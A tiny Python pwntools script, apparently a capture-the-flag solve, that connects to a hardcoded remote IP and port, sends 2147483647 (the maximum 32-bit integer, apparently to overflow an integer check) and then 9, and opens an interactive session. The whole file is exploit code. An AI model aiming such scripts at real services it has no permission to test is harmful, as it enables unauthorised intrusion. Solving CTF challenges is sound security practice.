from pwn import *
io = remote('103.69.97.144', 6051)
print(io.recvuntil(b':'))
io.sendline(b'2147483647')
print(io.recvuntil(b':'))
io.sendline(b'9')
print(io.recvuntil(b'tor'))
io.interactive()
